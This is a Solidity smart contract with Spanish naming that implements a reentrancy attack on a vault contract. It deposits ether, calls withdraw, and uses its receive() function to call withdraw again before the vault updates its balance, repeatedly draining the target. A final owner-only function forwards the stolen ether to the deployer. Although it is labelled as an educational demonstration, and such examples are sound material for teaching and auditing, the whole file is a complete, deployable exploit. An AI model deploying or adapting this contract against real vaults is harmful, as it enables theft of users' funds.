// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBoveda {
    function depositar() external payable;
    function retirar() external;
}

// Solo para demostracion educativa
contract ContratoAtacante {
    IBoveda public objetivo;
    address public propietario;

    constructor(address _objetivo) {
        objetivo = IBoveda(_objetivo);
        propietario = msg.sender;
    }

    function atacar() external payable {
        objetivo.depositar{value: msg.value}();
        objetivo.retirar();
    }

    // Esta funcion se llama automaticamente cuando el contrato recibe ETH
    receive() external payable {
        if (address(objetivo).balance >= msg.value) {
            objetivo.retirar(); // Llama de nuevo antes de que actualice el saldo
        }
    }

    function retirarGanancias() external {
        require(msg.sender == propietario);
        payable(propietario).transfer(address(this).balance);
    }
}
